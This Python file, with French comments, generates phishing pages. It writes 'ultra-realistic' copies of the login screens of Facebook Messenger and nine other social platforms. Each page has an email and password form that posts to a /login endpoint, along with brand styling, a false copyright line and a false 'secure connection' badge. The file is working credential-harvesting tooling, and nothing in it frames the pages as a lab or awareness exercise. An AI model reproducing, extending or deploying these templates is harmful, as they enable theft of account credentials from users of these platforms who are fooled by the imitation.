#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Templates Réseaux Sociaux Ultra-Réalistes
Génère des templates de réseaux sociaux avec un design moderne
"""

import os

class SocialTemplates:
    def __init__(self, templates_dir):
        self.templates_dir = templates_dir
        
    def generate_facebook_template(self):
        """Génère le template Facebook Messenger ultra-réaliste comme l'image"""
        html = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Messenger - Connexion</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }
        
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .logo {
            margin-bottom: 24px;
        }
        
        .logo svg {
            width: 48px;
            height: 48px;
        }
        
        .title {
            color: #1c1e21;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            line-height: 1.2;
        }
        
        .subtitle {
            color: #65676b;
            font-size: 14px;
            margin-bottom: 32px;
            line-height: 1.4;
        }
        
        .signin-text {
            color: #1c1e21;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 24px;
        }
        
        .form-group {
            margin-bottom: 16px;
            text-align: left;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            font-family: inherit;
            background: #ffffff;
            transition: border-color 0.2s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }
        
        .form-group input::placeholder {
            color: #65676b;
        }
        
        .continue-btn {
            width: 100%;
            background: #1877f2;
            color: white;
            border: none;
            padding: 12px 16px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
            margin-bottom: 16px;
        }
        
        .continue-btn:hover {
            background: #166fe5;
        }
        
        .continue-btn:active {
            background: #1464d0;
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
            text-align: left;
        }
        
        .checkbox-group input[type="checkbox"] {
            margin-right: 8px;
            width: 16px;
            height: 16px;
            accent-color: #1877f2;
        }
        
        .checkbox-group label {
            color: #1c1e21;
            font-size: 14px;
            cursor: pointer;
        }
        
        .footer {
            border-top: 1px solid #dddfe2;
            padding-top: 16px;
            margin-top: 24px;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px;
            font-size: 12px;
            color: #65676b;
        }
        
        .footer-links a {
            color: #65676b;
            text-decoration: none;
            padding: 0 8px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .footer-links .separator {
            color: #dddfe2;
        }
        
        .copyright {
            margin-top: 16px;
            font-size: 12px;
            color: #65676b;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 24px 16px;
                margin: 0;
                border-radius: 0;
            }
            
            .title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 36 36" fill="#1877f2" height="48" width="48">
                <path d="M18 0C8.059 0 0 8.059 0 18s8.059 18 18 18 18-8.059 18-18S27.941 0 18 0zm0 2c8.837 0 16 7.163 16 16s-7.163 16-16 16S2 26.837 2 18 9.163 2 18 2z"/>
                <path d="M18 6c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12S24.627 6 18 6zm0 2c5.514 0 10 4.486 10 10s-4.486 10-10 10S8 23.514 8 18 12.486 8 18 8z" fill="#ffffff"/>
                <path d="M18 10c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zm0 2c3.314 0 6 2.686 6 6s-2.686 6-6 6-6-2.686-6-6 2.686-6 6-6z" fill="#ffffff"/>
                <path d="M18 14c-2.209 0-4 1.791-4 4s1.791 4 4 4 4-1.791 4-4-1.791-4-4-4z" fill="#ffffff"/>
            </svg>
        </div>
        
        <h1 class="title">Messenger</h1>
        <p class="subtitle">Instantly connect with people in your life.</p>
        
        <p class="signin-text">Sign in with Facebook to get started.</p>
        
        <form method="POST" action="/login" id="loginForm">
            <div class="form-group">
                <input type="text" id="email" name="email" placeholder="Email address or phone number" required autocomplete="email">
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
            </div>
            
            <button type="submit" class="continue-btn" id="loginBtn">
                Continue
            </button>
            
            <div class="checkbox-group">
                <input type="checkbox" id="keep-signed" name="keep_signed">
                <label for="keep-signed">Keep me signed in</label>
            </div>
        </form>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#">Not on Facebook?</a>
                <span class="separator">|</span>
                <a href="#">Forgotten password</a>
                <span class="separator">|</span>
                <a href="#">Data Policy</a>
                <span class="separator">|</span>
                <a href="#">Terms</a>
                <span class="separator">|</span>
                <a href="#">Cookies Policy</a>
            </div>
            <div class="copyright">
                © Facebook 2024
            </div>
        </div>
    </div>
    
    <script>
        // Animation de chargement réaliste
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const btn = document.getElementById('loginBtn');
            btn.innerHTML = 'Signing in...';
            btn.style.opacity = '0.7';
            btn.disabled = true;
            
            // Simuler un délai de connexion
            setTimeout(() => {
                btn.innerHTML = 'Continue';
                btn.style.opacity = '1';
                btn.disabled = false;
            }, 2000);
        });
        
        // Effet de focus réaliste
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.style.borderColor = '#1877f2';
            });
            
            input.addEventListener('blur', function() {
                this.style.borderColor = '#dddfe2';
            });
        });
        
        // Validation en temps réel
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const continueBtn = document.getElementById('loginBtn');
        
        function validateForm() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (email && password) {
                continueBtn.style.opacity = '1';
                continueBtn.disabled = false;
            } else {
                continueBtn.style.opacity = '0.6';
                continueBtn.disabled = true;
            }
        }
        
        emailInput.addEventListener('input', validateForm);
        passwordInput.addEventListener('input', validateForm);
        
        // Initialisation
        validateForm();
    </script>
</body>
</html>
        """
        with open(f"{self.templates_dir}/facebook.html", 'w', encoding='utf-8') as f:
            f.write(html)
            
    def generate_social_template(self, platform_name, platform_color, platform_icon):
        """Génère un template de réseau social ultra-stylisé"""
        # Template spécial pour Facebook
        if platform_name.lower() == "facebook":
            self.generate_facebook_template()
            return
            
        html = f"""
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{platform_name} - Connexion</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {{ 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }}
        
        body {{ 
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, {platform_color} 0%, {platform_color}dd 50%, {platform_color}bb 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }}
        
        body::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="50" cy="50" r="1" fill="white" opacity="0.1"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
            pointer-events: none;
        }}
        
        .container {{
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
            padding: 50px;
            width: 100%;
            max-width: 450px;
            position: relative;
            border: 1px solid rgba(255, 255, 255, 0.2);
            animation: slideUp 0.6s ease-out;
        }}
        
        @keyframes slideUp {{
            from {{
                opacity: 0;
                transform: translateY(30px);
            }}
            to {{
                opacity: 1;
                transform: translateY(0);
            }}
        }}
        
        .logo {{
            text-align: center;
            margin-bottom: 40px;
            animation: fadeIn 0.8s ease-out 0.2s both;
            font-size: 48px;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: scale(0.9); }}
            to {{ opacity: 1; transform: scale(1); }}
        }}
        
        .title {{
            text-align: center;
            color: #1a202c;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 40px;
            animation: fadeIn 0.8s ease-out 0.4s both;
        }}
        
        .form-group {{
            margin-bottom: 25px;
            animation: fadeIn 0.8s ease-out 0.6s both;
        }}
        
        .form-group label {{
            display: block;
            color: #4a5568;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 10px;
            transition: color 0.3s ease;
        }}
        
        .form-group input {{
            width: 100%;
            padding: 16px 20px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 16px;
            font-family: 'Inter', sans-serif;
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
        }}
        
        .form-group input:focus {{
            outline: none;
            border-color: {platform_color};
            box-shadow: 0 0 0 3px {platform_color}20;
            background: rgba(255, 255, 255, 1);
        }}
        
        .form-group input:hover {{
            border-color: #cbd5e0;
        }}
        
        .login-btn {{
            width: 100%;
            background: linear-gradient(135deg, {platform_color} 0%, {platform_color}dd 100%);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Inter', sans-serif;
            position: relative;
            overflow: hidden;
            animation: fadeIn 0.8s ease-out 0.8s both;
        }}
        
        .login-btn::before {{
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }}
        
        .login-btn:hover::before {{
            left: 100%;
        }}
        
        .login-btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 10px 25px {platform_color}40;
        }}
        
        .login-btn:active {{
            transform: translateY(0);
        }}
        
        .forgot-link {{
            text-align: center;
            margin-top: 25px;
            animation: fadeIn 0.8s ease-out 1s both;
        }}
        
        .forgot-link a {{
            color: {platform_color};
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            transition: color 0.3s ease;
        }}
        
        .forgot-link a:hover {{
            color: {platform_color}dd;
            text-decoration: underline;
        }}
        
        .security-notice {{
            text-align: center;
            margin-top: 30px;
            color: #718096;
            font-size: 13px;
            animation: fadeIn 0.8s ease-out 1.2s both;
        }}
        
        @media (max-width: 480px) {{
            .container {{
                padding: 30px 20px;
                margin: 10px;
            }}
            
            .title {{
                font-size: 24px;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">{platform_icon}</div>
        <h1 class="title">Connexion à {platform_name}</h1>
        <form method="POST" action="/login" id="loginForm">
            <div class="form-group">
                <label for="email">Adresse e-mail ou téléphone</label>
                <input type="text" id="email" name="email" required autocomplete="email">
            </div>
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            <button type="submit" class="login-btn" id="loginBtn">
                Se connecter
            </button>
        </form>
        <div class="forgot-link">
            <a href="#">Mot de passe oublié ?</a>
        </div>
        <div class="security-notice">
            🔒 Connexion sécurisée - Protection de vos données
        </div>
    </div>
    
    <script>
        // Animation de chargement
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            const btn = document.getElementById('loginBtn');
            btn.innerHTML = 'Connexion en cours...';
            btn.style.opacity = '0.7';
            btn.disabled = true;
        }});
        
        // Effet de focus amélioré
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {{
            input.addEventListener('focus', function() {{
                this.parentElement.style.transform = 'scale(1.02)';
            }});
            
            input.addEventListener('blur', function() {{
                this.parentElement.style.transform = 'scale(1)';
            }});
        }});
    </script>
</body>
</html>
        """
        filename = platform_name.lower().replace(' ', '').replace('&', '') + '.html'
        with open(f"{self.templates_dir}/{filename}", 'w', encoding='utf-8') as f:
            f.write(html)
            
    def generate_all_social_templates(self):
        """Génère tous les templates de réseaux sociaux"""
        print("📱 Génération des templates réseaux sociaux ultra-réalistes...")
        
        # Templates de réseaux sociaux (ultra-stylisés)
        social_platforms = [
            ("Facebook", "#1877F2", "📘"),
            ("Instagram", "#E4405F", "📷"),
            ("Twitter", "#1DA1F2", "🐦"),
            ("LinkedIn", "#0A66C2", "💼"),
            ("TikTok", "#000000", "🎵"),
            ("Snapchat", "#FFFC00", "👻"),
            ("YouTube", "#FF0000", "📺"),
            ("Discord", "#5865F2", "🎮"),
            ("Reddit", "#FF4500", "🤖"),
            ("Pinterest", "#E60023", "📌")
        ]
        
        for platform_name, platform_color, platform_icon in social_platforms:
            self.generate_social_template(platform_name, platform_color, platform_icon)
            print(f"✅ {platform_name}")
            
        print(f"📱 {len(social_platforms)} templates réseaux sociaux créés.") 